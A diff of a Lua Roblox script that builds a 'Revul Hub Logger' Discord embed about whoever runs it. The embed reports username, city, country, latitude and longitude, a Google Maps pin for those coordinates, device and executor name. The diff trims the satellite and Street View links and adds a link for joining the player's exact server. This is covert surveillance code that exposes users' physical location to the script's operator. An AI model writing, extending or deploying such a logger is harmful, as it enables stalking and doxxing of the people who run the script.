@@ -56,24 +56,8 @@ end)
 -- 📍 Ubicación formateada
 local fullLocation = city .. ", " .. region .. ", " .. country
 
--- 🗺️ LINK SATÉLITE
-local satelliteLink = "https://www.google.com/maps/@?api=1&map_action=map" ..
-"&center=" .. lat .. "," .. lon ..
-"&zoom=18" ..
-"&basemap=satellite"
-
--- 🚶 STREET VIEW LINK
-local streetViewLink = "https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=" ..
-lat .. "," .. lon
-
--- 📌 LINK CON PIN (más claro)
-local pinLink = "https://www.google.com/maps?q=" .. lat .. "," .. lon .. "&z=18"
-
--- 🖼️ THUMBNAIL DEL MAPA (Google Static Maps)
-local mapThumbnail = "https://maps.googleapis.com/maps/api/staticmap?center=" ..
-lat .. "," .. lon ..
-"&zoom=15&size=600x300&markers=color:red%7C" .. lat .. "," .. lon ..
-"&maptype=satellite"
+-- 🗺️ Google Maps link
+local mapsLink = "https://www.google.com/maps?q=" .. lat .. "," .. lon
 
 -- 🎮 Nombre del juego
 local gameName = "Unknown Game"
@@ -97,17 +81,16 @@ local accessType = WHITELIST[player.UserId] and "Whitelist" or "Key"
 -- 📅 Fecha
 local timeStamp = os.date("%Y-%m-%d %H:%M:%S")
 
+-- 🧾 LINK PARA UNIRSE AL SERVIDOR
+local serverLink = "https://www.roblox.com/games/start?placeId=" ..
+game.PlaceId .. "&gameInstanceId=" .. game.JobId
+
 -- 📡 DATA DISCORD
 local data = {
     ["username"] = "Revul Hub Logger",
     ["embeds"] = {{
         ["title"] = "🚀 Script Ejecutado",
         ["color"] = 65280,
-
-        ["thumbnail"] = {
-            ["url"] = mapThumbnail
-        },
-
         ["fields"] = {
 
             {["name"] = "👤 Username", ["value"] = player.Name, ["inline"] = true},
@@ -123,9 +106,9 @@ local data = {
             {["name"] = "🧭 Lat", ["value"] = tostring(lat), ["inline"] = true},
             {["name"] = "🧭 Lon", ["value"] = tostring(lon), ["inline"] = true},
 
-            {["name"] = "📌 Pin Map", ["value"] = pinLink, ["inline"] = false},
-            {["name"] = "🛰️ Satellite", ["value"] = satelliteLink, ["inline"] = false},
-            {["name"] = "🚶 Street View", ["value"] = streetViewLink, ["inline"] = false},
+            {["name"] = "🗺️ Maps", ["value"] = mapsLink, ["inline"] = false},
+
+            {["name"] = "🔗 Server Join", ["value"] = serverLink, ["inline"] = false},
 
             {["name"] = "📱 Device", ["value"] = deviceType, ["inline"] = true},
             {["name"] = "🖥️ Executor", ["value"] = executorName, ["inline"] = true},
